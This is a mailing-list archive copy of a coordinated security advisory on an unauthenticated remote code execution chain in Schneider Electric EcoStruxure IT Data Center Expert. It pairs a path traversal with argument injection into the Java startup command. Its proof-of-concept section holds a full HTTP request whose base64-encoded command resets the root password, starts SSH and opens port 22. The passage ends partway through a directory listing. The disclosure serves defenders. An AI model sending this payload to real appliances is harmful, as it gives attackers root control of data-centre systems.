---
title: KL-001-2025-007: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Remote Code Execution
url: https://seclists.org/fulldisclosure/2025/Jul/6
source: Full Disclosure
date: 2025-07-10
fetch_date: 2025-10-06T23:53:08.480782
---

# KL-001-2025-007: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Remote Code Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-007: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Remote Code Execution

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 9 Jul 2025 17:15:24 -0500

---

```
KL-001-2025-007: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Remote Code Execution

Title: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Remote Code Execution
Advisory ID: KL-001-2025-007
Publication Date: 2025-07-09
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-007.txt

1. Vulnerability Details

     Affected Vendor: Schneider Electric
     Affected Product: EcoStruxure IT Data Center Expert
     Affected Version: 8.3 and prior
     Platform: CentOS
     CWE Classification: CWE-23: Relative Path Traversal,
                         CWE-78: Improper Neutralization of Special
                         Elements used in an OS Command
                         ('OS Command Injection')
     CVE ID: CVE-2025-50121

2. Vulnerability Description

     The Data Center Expert ("DCE") appliance lacks authorization
     controls and allows anyone to masquerade as a NetBotz camera. A
     path traversal vulnerability enables an attacker to create
     a malicious folder name capable of injecting arguments into
     specific shell commands during application boot. By leveraging
     a separate server-side request forgery (SSRF) vulnerability,
     an attacker can chain these two issues to obtain a root shell
     from a completely unauthenticated perspective.

3. Technical Description

     APC NetBotz devices can be configured to report information
     to the Data Center Expert appliance via the DCE web
     application. This information contains various metrics, device
     alerts, and photographs.

     The "/botpost/surveillance" HTTP route enables devices to
     upload images via a multipart POST request. This route does
     not require authentication.

     When an image is uploaded, the first parameter in the POST
     body is loosely parsed as XML. This XML contains the variable
     "nbCameraUid" which is used to construct a folder name that is
     later created on the DCE filesystem. No input validation is
     done for "nbCameraUid", enabling an unauthenticated attacker to
     abuse dot-segments (../) and write a folder with an arbitrary
     name anywhere on the DCE filesystem.

     This behavior is dangerous, as several shell scripts exist on
     the appliance that leverage globbing to build commands that
     are later executed. For example, the "nbfunctions" script uses
     the following snippet to build the "ISXC_CLASSPATH" variable:

         for i in "$NBC_HOME"/tomcat/lib/*.jar; do
             ISXC_CLASSPATH="${ISXC_CLASSPATH}:${i}"
         done"

     This shell script "central.sh" uses the "ISXC_CLASSPATH"
     varible as an argument when starting the Tomcat web server
     after a reboot:

         "$JAVA_HOME"/bin/java -server -Dprocess.name=isxc -Djava.awt.headless=true \
                 $JMEM_OPTS $JGC $JMISC_OPTS ${DEBUG_OPTS:+"$DEBUG_OPTS"} $JMX_OPTS $PROFILE_OPTS \
                 -DMAC_ADDRESS="$MAC_ADDRESS" -DNBC_HOME="$NBC_HOME" -Duser.timezone="$NBC_TIMEZONE" \
                 -Duser.language="$NBC_LANG" -Duser.country="$NBC_COUNTRY" \
-Dorg.apache.cxf.Logger=org.apache.cxf.common.logging.Log4jLogger \
-Dorg.restlet.engine.loggerFacadeClass=org.restlet.ext.slf4j.Slf4jLoggerFacade \
                 -cp $ISXC_CLASSPATH com.netbotz.server.Main

     Since globbing does not differentiate between folders and files,
     it is possible to inject command-line arguments into the "java"
     invocation as long as the folder name ends with the string
     ".jar".

     To exploit this behavior, an attacker can inject the "-Xms1m",
     "-Xmx2m", and "XX:OnOutOfMemoryError" arguments, which severely
     limit the total memory allocated for the "java" runtime. The
     value of the "XX:OnOutOfMemoryError" argument will be executed
     as an additional shell command whenever this limited memory
     is exhausted.

4. Mitigation and Remediation Recommendation

     Version 9.0 of EcoStruxure IT Data Center Expert includes
     fixes for these vulnerabilities and is available upon request
     from Schneider Electric's Customer Care Center. Refer to
https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2025-189-01&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2025-189-01.pdf.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2025-02-14 : KoreLogic reports vulnerability details to
                  Schneider Electric CPCERT.
     2025-02-17 : Vendor acknowledges receipt of KoreLogic's
                  submission.
     2025-02-25 : Vendor confirms the reported vulnerability.
     2025-02-28 : Vendor requests a meeting with KoreLogic to discuss
                  the timeline of remediation efforts for this
                  vulnerability, as well as for associated submissions
                  from KoreLogic.
     2025-03-04 : KoreLogic and Schneider Electric agree to embargo
                  vulnerability details until product update 9.0,
                  circa July, 2025.
     2025-06-20 : Vendor notifies KoreLogic that the publication date
                  for this vulnerability will be 2025-07-08.
     2025-07-08 : Vendor public disclosure.
     2025-07-09 : KoreLogic public disclosure.

7. Proof of Concept

     As a proof-of-concept, the following HTTP request can be sent
     to the DCE appliance:

         POST /botpost/surveillance HTTP/1.1
         Host: victim.com
         Content-Length: 1010
         Content-Type: multipart/form-data; boundary=09b3621e3cb4509abb3722922089bc54

         --09b3621e3cb4509abb3722922089bc54
         Content-Disposition: form-data; name="foo"; filename=""
         Content-Type: application/xml

         <data>
             somePrefix
             timestamp="1627896543210"
             someMiddleData
             nbSerialNum<string-val>00:00:00:00:00:00<
             someMiddleData
```

             <variable varid="/../../../../../../../../../usr/local/netbotz/nbc/tomcat/lib/zzz -Xms1m -Xmx2m
-XX:-OmitStackTraceInFastThrow
-XX:OnOutOfMemoryError=echo${IFS}ZWNobyByb290OmtvcmVsb2dpYyB8IGNocGFzc3dkOyBzeXN0ZW1jdGwgc3RhcnQgc3NoZDsgaXB0YWJsZXMgLUkgSU5QVVQgLXAgdGNwIC0tZHBvcnQgMjIgLWogQUNDRVBU|base64$IFS-d|bash
-Dfoo=bar.jar" classpath="/nbCameraUid1337"/>

```
             someMiddleData
             <variable varid="somethingElse" classpath="/nbEnclosureEnc1337"/>
             someSuffix
         </data>
         --09b3621e3cb4509abb3722922089bc54
         Content-Disposition: form-data; name="bar"; filename="korelogic.jpeg"
         Content-Type: image/jpeg

         z
         --09b3621e3cb4509abb3722922089bc54--

     This will create a maliciously named folder in the
     "/usr/local/netbotz/nbc/tomcat/lib/" directory:

         [root@dce ~]# ls /usr/local/netbotz/nbc/tomcat/lib/
          catalina.jar
          catalina-optional.jar
          commons-modeler-2.0.1.jar
          jsp-api.jar
          naming-factory.jar
          ...